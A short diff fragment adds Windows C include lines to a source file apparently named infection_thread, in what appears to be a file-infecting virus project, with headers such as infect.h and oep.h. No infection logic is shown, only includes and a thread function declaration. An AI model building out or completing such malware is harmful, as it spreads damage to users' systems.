@@ -1,4 +1,16 @@
+#include <stdint.h>
+#include <stdio.h>
+#include <windows.h>
+
+#include "checksum.h"
+#include "checksum_list.h"
+#include "code_begin.h"
+#include "code_end.h"
+#include "data.h"
+#include "infect.h"
 #include "infection_thread.h"
+#include "oep.h"
+#include "utility.h"
 
 static DWORD WINAPI run(LPVOID param);
 
